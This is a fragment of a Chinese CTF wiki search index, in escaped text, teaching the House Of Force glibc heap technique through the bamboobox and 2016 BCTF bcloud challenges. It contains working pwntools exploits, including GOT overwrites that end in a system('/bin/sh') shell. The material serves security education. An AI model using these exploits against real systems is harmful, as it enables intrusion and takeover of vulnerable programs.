\u7684\u5185\u5b58\uff0c\u7528\u6765\u4fdd\u7559\n\u4e24\u4e2a\u51fd\u6570\u6307\u9488\n\u3002\n\n\n\u8be5\u7a0b\u5e8f\u5927\u6982\u5c31\u662f\u5bf9\u4e8e\u76d2\u5b50\u91cc\u7684\u7269\u54c1\u8fdb\u884c\u6dfb\u52a0\u548c\u5220\u9664\n\n\n\n\n\u5c55\u793a\u76d2\u5b50\u91cc\u7684\u5185\u5bb9\uff0c\u4f9d\u6b21\u76d2\u5b50\u91cc\u6bcf\u4e00\u4e2a\u7269\u54c1\u7684\u540d\u5b57\u3002\n\n\n\u5411\u76d2\u5b50\u91cc\u6dfb\u52a0\u7269\u54c1\uff0c\u6839\u636e\u7528\u6237\u8f93\u5165\u7684\u5927\u5c0f\u6765\u4e3a\u6bcf\u4e00\u4e2a\u7269\u54c1\u7533\u8bf7\u5bf9\u5e94\u7684\u5185\u5b58\uff0c\u4f5c\u4e3a\u5176\u5b58\u50a8\u540d\u5b57\u7684\u7a7a\u95f4\u3002\u4f46\u662f\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u91cc\u8bfb\u53d6\u540d\u5b57\u4f7f\u7528\u7684\u662f \nread\n \u51fd\u6570\uff0c\u8bfb\u53d6\u957f\u5ea6\u7684\u53c2\u6570\u662f\u7528\u6237\u8f93\u5165\u7684 v2\uff0c\u800c read \u7684\u7b2c\u4e09\u4e2a\u53c2\u6570\u662f\u65e0\u7b26\u53f7\u6574\u6570\uff0c\u5982\u679c\u6211\u4eec\u8f93\u5165\u8d1f\u6570\uff0c\u5c31\u53ef\u4ee5\u8bfb\u53d6\u4efb\u610f\u957f\u5ea6\u3002\u4f46\u662f\u6211\u4eec\u9700\u8981\u786e\u4fdd\u8be5\u6570\u503c\u6ee1\u8db3\nREQUEST_OUT_OF_RANGE\n \u7684\u7ea6\u675f\uff0c\u6240\u4ee5\u8fd9\u91cc\u5b58\u5728\n\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\n\u7684\u6f0f\u6d1e\u3002\u4f46\u5373\u4f7f\u8fd9\u6837\uff0c\u7b2c\u4e00\u6b21\u7684\u65f6\u5019\u4e5f\u6bd4\u8f83\u96be\u4ee5\u5229\u7528\uff0c\u56e0\u4e3a\u521d\u59cb\u65f6\u5019\u5806\u7684 top chunk \u7684\u5927\u5c0f\u4e00\u822c\u662f\u4e0d\u4f1a\u5f88\u5927\u7684\u3002\n\n\n\u4fee\u6539\u7269\u54c1\u7684\u540d\u5b57\uff0c\u6839\u636e\u7ed9\u5b9a\u7684\u7d22\u5f15\uff0c\u4ee5\u53ca\u5927\u5c0f\uff0c\u5411\u6307\u5b9a\u7d22\u5f15\u7684\u7269\u54c1\u4e2d\u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u540d\u5b57\u3002\u8fd9\u91cc\u957f\u5ea6\u7531\u7528\u6237\u6765\u8bfb\u5165\uff0c\u4e5f\u5b58\u5728\n\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\n\u7684\u6f0f\u6d1e\u3002\n\n\n\u5220\u9664\u7269\u54c1\uff0c\u5c06\u5bf9\u5e94\u7269\u54c1\u7684\u540d\u5b57\u7684\u5927\u5c0f\u7f6e\u4e3a0\uff0c\u5e76\u5c06\u5bf9\u5e94\u7684 content \u7f6e\u4e3a NULL\u3002\n\n\n\n\n\u6b64\u5916\uff0c\u7531\u4e8e\u8be5\u7a0b\u5e8f\u4e3b\u8981\u662f\u4e00\u4e2a\u6f14\u793a\u7a0b\u5e8f\uff0c\u6240\u4ee5\u7a0b\u5e8f\u4e2d\u6709\u4e00\u4e2a magic \u51fd\u6570\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6 flag\u3002\n\n\n\u5229\u7528\n\n\n\u7531\u4e8e\u7a0b\u5e8f\u4e2d\u6709\u4e2a magic \u51fd\u6570\uff0c\u6240\u4ee5\u6211\u4eec\u7684\u6838\u5fc3\u76ee\u7684\u662f\u8986\u76d6\u67d0\u4e2a\u6307\u9488\u4e3a magic \u51fd\u6570\u7684\u6307\u9488\u3002\u8fd9\u91cc\uff0c\u7a0b\u5e8f\u5728\u5f00\u59cb\u7684\u65f6\u5019\u7533\u8bf7\u4e86\u4e00\u5757\u5185\u5b58\u6765\u5b58\u50a8\u4e24\u4e2a\u51fd\u6570\u6307\u9488\uff0chello_message\u7528\u4e8e\u7a0b\u5e8f\u5f00\u59cb\u65f6\u4f7f\u7528\uff0cgoodbye_message \u7528\u4e8e\u5728\u7a0b\u5e8f\u7ed3\u675f\u65f6\u4f7f\u7528\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8986\u76d6 goodbye_message \u6765\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u3002\u5177\u4f53\u601d\u8def\u5982\u4e0b\n\n\n\n\n\u6dfb\u52a0\u7269\u54c1\uff0c\u5229\u7528\u5806\u6ea2\u51fa\u6f0f\u6d1e\u8986\u76d6 top chunk \u7684\u5927\u5c0f\u4e3a -1\uff0c\u5373 64 \u4f4d\u6700\u5927\u503c\u3002\n\n\n\u5229\u7528 house of force \u6280\u5de7\uff0c\u5206\u914d chunk \u81f3\u5806\u7684\u57fa\u5730\u5740\u3002\n\n\n\u8986\u76d6 goodbye_message \u4e3amagic \u51fd\u6570\u5730\u5740\u6765\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\n\n\n\n\n\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u89e6\u53d1top chunk \u8f6c\u79fb\u5230\u6307\u5b9a\u4f4d\u7f6e\u65f6\uff0c\u6240\u4f7f\u7528\u7684\u5927\u5c0f\u5e94\u8be5\u5408\u9002\uff0c\u4ee5\u4fbf\u4e8e\u8bbe\u7f6e\u65b0\u7684 top chunk \u5927\u5c0f\uff0c\u4ece\u800c\u53ef\u4ee5\u7ed5\u8fc7\u4e0b\u4e00\u6b21\u5206\u914dtop chunk \u7684\u68c0\u6d4b\u3002\n\n\nexp \u5982\u4e0b\n\n\n#!/usr/bin/env python\n\n\n# -*- coding: utf-8 -*-\n\n\nfrom pwn import *\n\n\nr\n \n=\n process\n(\n./bamboobox\n)\n\ncontext.log_level \n=\n \ndebug\n\n\n\ndef additem\n(\nlength, name\n)\n:\n    r.recvuntil\n(\n:\n)\n\n    r.sendline\n(\n2\n)\n\n    r.recvuntil\n(\n:\n)\n\n    r.sendline\n(\nstr\n(\nlength\n))\n\n    r.recvuntil\n(\n:\n)\n\n    r.sendline\n(\nname\n)\n\n\n\ndef modify\n(\nidx, length, name\n)\n:\n    r.recvuntil\n(\n:\n)\n\n    r.sendline\n(\n3\n)\n\n    r.recvuntil\n(\n:\n)\n\n    r.sendline\n(\nstr\n(\nidx\n))\n\n    r.recvuntil\n(\n:\n)\n\n    r.sendline\n(\nstr\n(\nlength\n))\n\n    r.recvuntil\n(\n:\n)\n\n    r.sendline\n(\nname\n)\n\n\n\ndef remove\n(\nidx\n)\n:\n    r.recvuntil\n(\n:\n)\n\n    r.sendline\n(\n4\n)\n\n    r.recvuntil\n(\n:\n)\n\n    r.sendline\n(\nstr\n(\nidx\n))\n\n\n\ndef show\n()\n:\n    r.recvuntil\n(\n:\n)\n\n    r.sendline\n(\n1\n)\n\n\n\n\nmagic\n \n=\n 0x400d49\n\n# we must alloc enough size, so as to successfully alloc from fake topchunk\n\nadditem\n(\n0x30, \nddaa\n)\n  \n# idx 0\n\n\npayload\n \n=\n 0x30 * \na\n  \n# idx 0\ns content\n\n\npayload\n \n+=\n \na\n * \n8\n + p64\n(\n0xffffffffffffffff\n)\n  \n# top chunk\ns prev_size and size\n\n\n# modify topchunk\ns size to -1\n\nmodify\n(\n0\n, 0x41, payload\n)\n\n\n# top chunk\ns offset to heap base\n\n\noffset_to_heap_base\n \n=\n -\n(\n0x40 + 0x20\n)\n\n\nmalloc_size\n \n=\n offset_to_heap_base - 0x8 - 0xf\n\n#gdb.attach(r)\n\nadditem\n(\nmalloc_size, \ndada\n)\n\nadditem\n(\n0x10, p64\n(\nmagic\n)\n * \n2\n)\n\nprint r.recv\n()\n\nr.interactive\n()\n\n\n\n\n\n\u5f53\u7136\uff0c\u8fd9\u4e00\u9898\u4e5f\u53ef\u4ee5\u4f7f\u7528 unlink \u7684\u65b9\u6cd5\u6765\u505a\u3002\n\n\n2016 BCTF bcloud\n\n\n\u57fa\u672c\u4fe1\u606f\n\n\n\u279c  2016_bctf_bcloud git:\n(\nmaster\n)\n file bcloud   \nbcloud: ELF \n32\n-bit LSB executable, Intel \n80386\n, version \n1\n \n(\nSYSV\n)\n, dynamically linked, interpreter /lib/ld-linux.so.2, \nfor\n GNU/Linux \n2\n.6.24, BuildID\n[\nsha1\n]=\n96a3843007b1e982e7fa82fbd2e1f2cc598ee04e, stripped\n\u279c  2016_bctf_bcloud git:\n(\nmaster\n)\n checksec bcloud  \n\n[\n*\n]\n \n/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/2016_bctf_bcloud/bcloud\n\n    Arch:     i386-32-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      No PIE \n(\n0x8048000\n)\n\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\uff0c\u8fd9\u662f\u4e00\u4e2a\u52a8\u6001\u94fe\u63a5\u7684 32 \u4f4d\u7a0b\u5e8f\uff0c\u4e3b\u8981\u5f00\u542f\u4e86 Canary \u4fdd\u62a4\u4e0e NX \u4fdd\u62a4\u3002\n\n\n\u57fa\u672c\u529f\u80fd\n\n\n\u7a0b\u5e8f\u5927\u6982\u662f\u4e00\u4e2a\u4e91\u7b14\u8bb0\u7ba1\u7406\u7cfb\u7edf\u3002\u9996\u5148\uff0c\u7a0b\u5e8f\u4f1a\u8fdb\u884c\u4e00\u4e9b\u521d\u59cb\u5316\uff0c\u8bbe\u7f6e\u7528\u6237\u7684\u540d\u5b57\uff0c\u7ec4\u7ec7\uff0chost\u3002\u7a0b\u5e8f\u4e3b\u8981\u6709\u4ee5\u4e0b\u51e0\u4e2a\u529f\u80fd\n\n\n\n\n\u65b0\u5efanote\uff0c\u6839\u636e\u7528\u6237\u7684\u8f93\u5165x\u7533\u8bf7x+4\u7684\u7a7a\u95f4\u4f5c\u4e3anote\u7684\u5927\u5c0f\u3002\n\n\n\u5c55\u793anote\uff0c\u5565\u529f\u80fd\u4e5f\u6ca1\u6709\u3002\u3002\n\n\n\u7f16\u8f91note\uff0c\u6839\u636e\u7528\u6237\u6307\u5b9a\u7684 note \u7f16\u8f91\u5bf9\u5e94\u7684\u5185\u5bb9\u3002\n\n\n\u5220\u9664note\uff0c\u5220\u9664\u5bf9\u5e94note\u3002\n\n\n\u540c\u6b65note\uff0c\u6807\u8bb0\u6240\u6709\u7684note\u5df2\u7ecf\u88ab\u540c\u6b65\u3002\n\n\n\n\n\u7136\u800c\u5728\u8fd9\u4e94\u4e2a\u529f\u80fd\u4e2d\u5e76\u6ca1\u6709\u53d1\u73b0\u5565\u6f0f\u6d1e\uff0c\uff0c\uff0c\u91cd\u65b0\u770b\u7a0b\u5e8f\uff0c\u7ed3\u679c\u53d1\u73b0\u7a0b\u5e8f\u5728\u521d\u59cb\u5316\u7684\u65f6\u5019\u51fa\u73b0\u4e86\u6f0f\u6d1e\u3002\u3002\n\n\n\u521d\u59cb\u5316\u540d\u5b57\n\n\nunsigned\n \nint\n \ninit_name\n()\n\n\n{\n\n  \nchar\n \ns\n;\n \n// [esp+1Ch] [ebp-5Ch]\n\n  \nchar\n \n*\ntmp\n;\n \n// [esp+5Ch] [ebp-1Ch]\n\n  \nunsigned\n \nint\n \nv3\n;\n \n// [esp+6Ch] [ebp-Ch]\n\n\n  \nv3\n \n=\n \n__readgsdword\n(\n0x14u\n);\n\n  \nmemset\n(\ns\n,\n \n0\n,\n \n0x50u\n);\n\n  \nputs\n(\nInput your name:\n);\n\n  \nread_str\n(\ns\n,\n \n64\n,\n \n\\n\n);\n\n  \ntmp\n \n=\n \n(\nchar\n \n*\n)\nmalloc\n(\n0x40u\n);\n\n  \nname\n \n=\n \ntmp\n;\n\n  \nstrcpy\n(\ntmp\n,\n \ns\n);\n\n  \ninfo\n(\ntmp\n);\n\n  \nreturn\n \n__readgsdword\n(\n0x14u\n)\n \n^\n \nv3\n;\n\n\n}\n\n\n\n\n\n\u8fd9\u91cc\u5982\u679c\u7a0b\u5e8f\u8bfb\u5165\u7684\u540d\u5b57\u4e3a64\u4e2a\u5b57\u7b26\uff0c\u90a3\u4e48\u5f53\u7a0b\u5e8f\u5728\u4f7f\u7528info\u51fd\u6570\u8f93\u51fa\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u65f6\uff0c\u5c31\u4f1a\u8f93\u51fa\u5bf9\u5e94\u7684tmp\u6307\u9488\u5185\u5bb9\uff0c\u4e5f\u5c31\u662f\u8bf4\n\u6cc4\u9732\u4e86\u5806\u7684\u5730\u5740\n\u3002\u3002\n\n\n\u521d\u59cb\u5316\u7ec4\u7ec7\u548corg\u7684\u65f6\u5019\u5b58\u5728\u6f0f\u6d1e\n\n\nunsigned\n \nint\n \ninit_org_host\n()\n\n\n{\n\n  \nchar\n \ns\n;\n \n// [esp+1Ch] [ebp-9Ch]\n\n  \nchar\n \n*\nv2\n;\n \n// [esp+5Ch] [ebp-5Ch]\n\n  \nchar\n \nv3\n;\n \n// [esp+60h] [ebp-58h]\n\n  \nchar\n \n*\nv4\n;\n \n// [esp+A4h] [ebp-14h]\n\n  \nunsigned\n \nint\n \nv5\n;\n \n// [esp+ACh] [ebp-Ch]\n\n\n  \nv5\n \n=\n \n__readgsdword\n(\n0x14u\n);\n\n  \nmemset\n(\ns\n,\n \n0\n,\n \n0x90u\n);\n\n  \nputs\n(\nOrg:\n);\n\n  \nread_str\n(\ns\n,\n \n64\n,\n \n10\n);\n\n  \nputs\n(\nHost:\n);\n\n  \nread_str\n(\nv3\n,\n \n64\n,\n \n10\n);\n\n  \nv4\n \n=\n \n(\nchar\n \n*\n)\nmalloc\n(\n0x40u\n);\n\n  \nv2\n \n=\n \n(\nchar\n \n*\n)\nmalloc\n(\n0x40u\n);\n\n  \norg\n \n=\n \nv2\n;\n\n  \nhost\n \n=\n \nv4\n;\n\n  \nstrcpy\n(\nv4\n,\n \nv3\n);\n\n  \nstrcpy\n(\nv2\n,\n \ns\n);\n\n  \nputs\n(\nOKay! Enjoy:)\n);\n\n  \nreturn\n \n__readgsdword\n(\n0x14u\n)\n \n^\n \nv5\n;\n\n\n}\n\n\n\n\n\n\u5f53\u8bfb\u5165\u7ec4\u7ec7\u65f6\uff0c\u7ed9\u5b9a 64 \u5b57\u8282\uff0c\u4f1a\u8986\u76d6 v2 \u7684\u4f4e\u5730\u5740\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u6211\u4eec\u53ef\u4ee5\u77e5\u9053 v2 \u662f\u4e0e top chunk \u76f8\u90bb\u7684 chunk\uff0c\u800c v2 \u6070\u597d\u4e0e org \u76f8\u90bb\uff0c\u90a3\u4e48\u7531\u4e8e\u5728 32 \u4f4d\u7a0b\u5e8f\u4e2d\uff0c\u4e00\u822c\u90fd\u662f 32 \u4f4d\u5168\u90e8\u90fd\u4f7f\u7528\uff0c\u8fd9\u91cc v2 \u6240\u5b58\u50a8\u7684\u5185\u5bb9\uff0c\u51e0\u4e4e\u5f88\u5927\u7a0b\u5ea6\u4e0a\u90fd\u4e0d\u662f \n\\x00\n \uff0c\u6240\u4ee5\u5f53\u6267\u884c strcpy \u51fd\u6570\u5411 v2 \u4e2d\u62f7\u8d1d\u5185\u5bb9\u65f6\uff0c\u5f88\u6709\u53ef\u80fd\u4f1a\u8986\u76d6top chunk\u3002\u8fd9\u5c31\u662f\u6f0f\u6d1e\u6240\u5728\u3002\n\n\n\u5229\u7528\n\n\n\n\n\u5229\u7528\u521d\u59cb\u5316\u540d\u5b57\u5904\u7684\u6f0f\u6d1e\u6cc4\u6f0f\u5806\u7684\u57fa\u5730\u5740\u3002\u3002\n\n\n\u5229\u7528 house of force \u5c06 top chunk \u5206\u914d\u81f3\u5168\u5c40\u7684 0x0804B0A0 \u7684 \nnotesize-8 \u5904\uff0c\u5f53\u518d\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u4fbf\u8fd4\u56denotesize\u5730\u5740\u5904\u7684\u5185\u5b58\uff0c\u4ece\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u63a7\u5236\u6240\u6709note\u7684\u5927\u5c0f\u4ee5\u53ca\u5bf9\u5e94\u7684\u5730\u5740\u4e86\u3002\n\n\n\u4fee\u6539\u524d\u4e09\u4e2a note \u7684\u5927\u5c0f\u4e3a16\uff0c\u5e76\u4fee\u6539\u5176\u6307\u9488\u4e3a free@got\uff0catoi@got\uff0catoi@got\n\n\n\u5c06 free@got \u4fee\u6539\u4e3a puts@plt\u3002\n\n\n\u6cc4\u6f0f atoi \u5730\u5740\u3002\n\n\n\u518d\u6b21\u4fee\u6539\u53e6\u5916\u4e00\u4e2a atoi got \u9879\u4e3a system \u5730\u5740\uff0c\u4ece\u800c\u62ff\u5230shell\u3002\n\n\n\n\n\u5177\u4f53\u811a\u672c\u5982\u4e0b\n\n\nfrom\n \npwn\n \nimport\n \n*\n\n\ncontext\n.\nterminal\n \n=\n \n[\ngnome-terminal\n,\n \n-x\n,\n \nsh\n,\n \n-c\n]\n\n\nif\n \nargs\n[\nDEBUG\n]:\n\n    \ncontext\n.\nlog_level\n \n=\n \ndebug\n\n\ncontext\n.\nbinary\n \n=\n \n./bcloud\n\n\nbcloud\n \n=\n \nELF\n(\n./bcloud\n)\n\n\nif\n \nargs\n[\nREMOTE\n]:\n\n    \np\n \n=\n \nremote\n(\n127.0.0.1\n,\n \n7777\n)\n\n\nelse\n:\n\n    \np\n \n=\n \nprocess\n(\n./bcloud\n)\n\n\nlog\n.\ninfo\n(\nPID: \n \n+\n \nstr\n(\nproc\n.\npidof\n(\np\n)[\n0\n]))\n\n\nlibc\n \n=\n \nELF\n(\n./libc.so.6\n)\n\n\n\n\ndef\n \noffset_bin_main_arena\n(\nidx\n):\n\n    \nword_bytes\n \n=\n \ncontext\n.\nword_size\n \n/\n \n8\n\n    \noffset\n \n=\n \n4\n  \n# lock\n\n    \noffset\n \n+=\n \n4\n  \n# flags\n\n    \noffset\n \n+=\n \nword_bytes\n \n*\n \n10\n  \n# offset fastbin\n\n    \noffset\n \n+=\n \nword_bytes\n \n*\n \n2\n  \n# top,last_remainder\n\n    \noffset\n \n+=\n \nidx\n \n*\n \n2\n \n*\n \nword_bytes\n  \n# idx\n\n    \noffset\n \n-=\n \nword_bytes\n \n*\n \n2\n  \n# bin overlap\n\n    \nreturn\n \noffset\n\n\n\n\ndef\n \nexp\n():\n\n    \n# leak heap base\n\n    \np\n.\nsendafter\n(\nInput your name:\n\\n\n,\n \na\n \n*\n \n64\n)\n\n    \np\n.\nrecvuntil\n(\nHey \n \n+\n \na\n \n*\n \n64\n)\n\n    \n# sub name\ns chunk\n s header\n\n    \nheap_base\n \n=\n \nu32\n(\np\n.\nrecv\n(\n4\n))\n \n-\n \n8\n\n    \nlog\n.\nsuccess\n(\nheap_base: \n \n+\n \nhex\n(\nheap_base\n))\n\n    \np\n.\nsendafter\n(\nOrg:\n\\n\n,\n \na\n \n*\n \n64\n)\n\n    \np\n.\nsendlineafter\n(\nHost:\n\\n\n,\n \np32\n(\n0xffffffff\n))\n\n    \n# name,org,host, for each is (0x40+8)\n\n    \ntopchunk_addr\n \n=\n \nheap_base\n \n+\n \n(\n0x40\n \n+\n \n8\n)\n \n*\n \n3\n\n\n    \n# make topchunk point to 0x0804B0A0-8\n\n    \np\n.\nsendlineafter\n(\noption---\n,\n \n1\n)\n\n    \nnotesize_addr\n \n=\n \n0x0804B0A0\n\n    \nnotelist_addr\n \n=\n \n0x0804B120\n\n    \ntargetaddr\n \n=\n \nnotesize_addr\n \n-\n \n8\n\n    \noffset_target_top\n \n=\n \ntargetaddr\n \n-\n \ntopchunk_addr\n\n    \n# 4 for size_t, 7 for malloc_allign\n\n    \nmalloc_size\n \n=\n \noffset_target_top\n \n-\n \n4\n \n-\n \n7\n\n    \n# plus 4 because malloc(v2 + 4);\n\n    \np\n.\nsendlineafter\n(\nInput the length of the note content:\n\\n\n,\n\n                    \nstr\n(\nmalloc_size\n \n-\n \n4\n))\n\n    \n# most likely malloc_size-4\n0...\n\n    \nif\n \nmalloc_size\n \n-\n \n4\n \n \n0\n:\n\n        \np\n.\nsendlineafter\n(\nInput the content:\n\\n\n,\n \n)\n\n\n    \n#gdb.attach(p)\n\n    \n# set notesize[0] = notesize[1] = notesize[2]=16\n\n    \n# set notelist[0] = free@got, notelist[1]= notelist[2]=atoi@got\n\n    \np\n.\nsendlineafter\n(\noption---\n,\n \n1\n)\n\n    \np\n.\nsendlineafter\n(\nInput the length of the note content:\n\\n\n,\n \nstr\n(\n1000\n))\n\n\n    \npayload\n \n=\n \np32\n(\n16\n)\n \n*\n \n3\n \n+\n \n(\nnotelist_addr\n \n-\n \nnotesize_addr\n \n-\n \n12\n)\n \n*\n \na\n \n+\n \np32\n(\n\n        \nbcloud\n.\ngot\n[\nfree\n])\n \n+\n \np32\n(\nbcloud\n.\ngot\n[\natoi\n])\n \n*\n \n2\n\n    \np\n.\nsendlineafter\n(\nInput the content:\n\\n\n,\n \npayload\n)\n\n\n    \n# overwrite free@got with puts@plt\n\n    \np\n.\nsendlineafter\n(\noption---\n,\n \n3\n)\n\n    \np\n.\nsendlineafter\n(\nInput the id:\n\\n\n,\n \nstr\n(\n0\n))\n\n    \np\n.\nsendlineafter\n(\nInput the new content:\n\\n\n,\n \np32\n(\nbcloud\n.\nplt\n[\nputs\n]))\n\n\n    \n# leak atoi addr by fake free\n\n    \np\n.\nsendlineafter\n(\noption---\n,\n \n4\n)\n\n    \np\n.\nsendlineafter\n(\nInput the id:\n\\n\n,\n \nstr\n(\n1\n))\n\n    \natoi_addr\n \n=\n \nu32\n(\np\n.\nrecv\n(\n4\n))\n\n    \nlibc_base\n \n=\n \natoi_addr\n \n-\n \nlibc\n.\nsymbols\n[\natoi\n]\n\n    \nsystem_addr\n \n=\n \nlibc_base\n \n+\n \nlibc\n.\nsymbols\n[\nsystem\n]\n\n    \nlog\n.\nsuccess\n(\nlibc base addr: \n \n+\n \nhex\n(\nlibc_base\n))\n\n\n    \n# overwrite atoi@got with system\n\n    \np\n.\nsendlineafter\n(\noption---\n,\n \n3\n)\n\n    \np\n.\nsendlineafter\n(\nInput the id:\n\\n\n,\n \nstr\n(\n2\n))\n\n    \np\n.\nsendlineafter\n(\nInput the new content:\n\\n\n,\n \np32\n(\nsystem_addr\n))\n\n\n    \n# get shell\n\n    \np\n.\nsendlineafter\n(\noption---\n,\n \n/bin/sh\n\\x00\n)\n\n    \np\n.\ninteractive\n()\n\n\n\n\nif\n \n__name__\n \n==\n \n__main__\n:\n\n    \nexp\n()\n\n\n\n\n\n\u9898\u76ee\n\n\n\n\n2016 Boston Key Party CTF cookbook", 
            "title": "House Of Force"
        }, 
        {
            "location": "/pwn/heap/house_of_force/#house-of-force", 
            "text": "", 
            "title": "House Of Force"
        }, 
        {
            "location": "/pwn/heap/house_of_force/#_1", 
            "text": "House Of Force \u5c5e\u4e8e House Of XXX \u7cfb\u5217\u7684\u5229\u7528\u65b9\u6cd5\uff0cHouse Of XXX \u662f 2004 \u5e74\u300aThe Malloc Maleficarum-Glibc Malloc Exploitation Techniques\u300b\u4e2d\u63d0\u51fa\u7684\u4e00\u7cfb\u5217\u9488\u5bf9 glibc \u5806\u5206\u914d\u5668\u7684\u5229\u7528\u65b9\u6cd5\u3002\n\u4f46\u662f\uff0c\u7531\u4e8e\u5e74\u4ee3\u4e45\u8fdc\u300aThe Malloc Maleficarum\u300b\u4e2d\u63d0\u51fa\u7684\u5927\u591a\u6570\u65b9\u6cd5\u4eca\u5929\u90fd\u4e0d\u80fd\u594f\u6548\uff0c\u6211\u4eec\u73b0\u5728\u6240\u6307\u7684 House Of XXX \u5229\u7528\u76f8\u6bd4 2004 \u5e74\u6587\u7ae0\u4e2d\u5199\u7684\u5df2\u6709\u8f83\u5927\u7684\u4e0d\u540c\u3002\u4f46\u662f\u300aThe Malloc Maleficarum\u300b\u4f9d\u7136\u662f\u4e00\u7bc7\u63a8\u8350\u9605\u8bfb\u7684\u6587\u7ae0\uff0c\u4f60\u53ef\u4ee5\u5728\u8fd9\u91cc\u8bfb\u5230\u5b83\u7684\u539f\u6587\uff1a https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/heap/house_of_force/#_2", 
            "text": "House Of Force \u662f\u4e00\u79cd\u5806\u5229\u7528\u65b9\u6cd5\uff0c\u4f46\u662f\u5e76\u4e0d\u662f\u8bf4 House Of Force \u5fc5\u987b\u5f97\u57fa\u4e8e\u5806\u6f0f\u6d1e\u6765\u8fdb\u884c\u5229\u7528\u3002\u5982\u679c\u4e00\u4e2a\u5806(heap based) \u6f0f\u6d1e\u60f3\u8981\u901a\u8fc7 House Of Force \u65b9\u6cd5\u8fdb\u884c\u5229\u7528\uff0c\u9700\u8981\u4ee5\u4e0b\u6761\u4ef6\uff1a   \u80fd\u591f\u4ee5\u6ea2\u51fa\u7b49\u65b9\u5f0f\u63a7\u5236\u5230 top chunk \u7684 size \u57df  \u80fd\u591f\u81ea\u7531\u5730\u63a7\u5236\u5806\u5206\u914d\u5c3a\u5bf8\u7684\u5927\u5c0f   House Of Force \u4ea7\u751f\u7684\u539f\u56e0\u5728\u4e8e glibc \u5bf9 top chunk \u7684\u5904\u7406\uff0c\u6839\u636e\u524d\u9762\u5806\u6570\u636e\u7ed3\u6784\u90e8\u5206\u7684\u77e5\u8bc6\u6211\u4eec\u5f97\u77e5\uff0c\u8fdb\u884c\u5806\u5206\u914d\u65f6\uff0c\u5982\u679c\u6240\u6709\u7a7a\u95f2\u7684\u5757\u90fd\u65e0\u6cd5\u6ee1\u8db3\u9700\u6c42\uff0c\u90a3\u4e48\u5c31\u4f1a\u4ece top chunk \u4e2d\u5206\u5272\u51fa\u76f8\u5e94\u7684\u5927\u5c0f\u4f5c\u4e3a\u5806\u5757\u7684\u7a7a\u95f4\u3002  \u90a3\u4e48\uff0c\u5f53\u4f7f\u7528 top chunk \u5206\u914d\u5806\u5757\u7684 size \u503c\u662f\u7531\u7528\u6237\u63a7\u5236\u7684\u4efb\u610f\u503c\u65f6\u4f1a\u53d1\u751f\u4ec0\u4e48\uff1f\u7b54\u6848\u662f\uff0c\u53ef\u4ee5\u4f7f\u5f97 top chunk\u6307\u5411\u6211\u4eec\u671f\u671b\u7684\u4efb\u4f55\u4f4d\u7f6e\uff0c\u8fd9\u5c31\u76f8\u5f53\u4e8e\u4e00\u6b21\u4efb\u610f\u5730\u5740\u5199\u3002\u7136\u800c\u5728 glibc \u4e2d\uff0c\u4f1a\u5bf9\u7528\u6237\u8bf7\u6c42\u7684\u5927\u5c0f\u548c top chunk \u73b0\u6709\u7684 size \u8fdb\u884c\u9a8c\u8bc1 // \u83b7\u53d6\u5f53\u524d\u7684top chunk\uff0c\u5e76\u8ba1\u7b97\u5176\u5bf9\u5e94\u7684\u5927\u5c0f\nvictim = av- top;\nsize   = chunksize(victim);\n// \u5982\u679c\u5728\u5206\u5272\u4e4b\u540e\uff0c\u5176\u5927\u5c0f\u4ecd\u7136\u6ee1\u8db3 chunk \u7684\u6700\u5c0f\u5927\u5c0f\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5206\u5272\u3002\nif ((unsigned long) (size)  = (unsigned long) (nb + MINSIZE)) \n{\n    remainder_size = size - nb;\n    remainder      = chunk_at_offset(victim, nb);\n    av- top        = remainder;\n    set_head(victim, nb | PREV_INUSE |\n            (av !=  main_arena ? NON_MAIN_ARENA : 0));\n    set_head(remainder, remainder_size | PREV_INUSE);\n\n    check_malloced_chunk(av, victim, nb);\n    void *p = chunk2mem(victim);\n    alloc_perturb(p, bytes);\n    return p;\n} \n\u7136\u800c\uff0c\u5982\u679c\u53ef\u4ee5\u7be1\u6539 size \u4e3a\u4e00\u4e2a\u5f88\u5927\u503c\uff0c\u5c31\u53ef\u4ee5\u8f7b\u677e\u7684\u901a\u8fc7\u8fd9\u4e2a\u9a8c\u8bc1\uff0c\u8fd9\u4e5f\u5c31\u662f\u6211\u4eec\u524d\u9762\u8bf4\u7684\u9700\u8981\u4e00\u4e2a\u80fd\u591f\u63a7\u5236top chunk size \u57df\u7684\u6f0f\u6d1e\u3002  (unsigned long) (size)  = (unsigned long) (nb + MINSIZE) \n\u4e00\u822c\u7684\u505a\u6cd5\u662f\u628a top chunk \u7684 size \u6539\u4e3a-1\uff0c\u56e0\u4e3a\u5728\u8fdb\u884c\u6bd4\u8f83\u65f6\u4f1a\u628a size \u8f6c\u6362\u6210\u65e0\u7b26\u53f7\u6570\uff0c\u56e0\u6b64 -1 \u4e5f\u5c31\u662f\u8bf4unsigned long \u4e2d\u6700\u5927\u7684\u6570\uff0c\u6240\u4ee5\u65e0\u8bba\u5982\u4f55\u90fd\u53ef\u4ee5\u901a\u8fc7\u9a8c\u8bc1\u3002  remainder      = chunk_at_offset(victim, nb);\nav- top        = remainder;\n\n/* Treat space at ptr + offset as a chunk */\n#define chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s))) \n\u4e4b\u540e\u8fd9\u91cc\u4f1a\u628a top 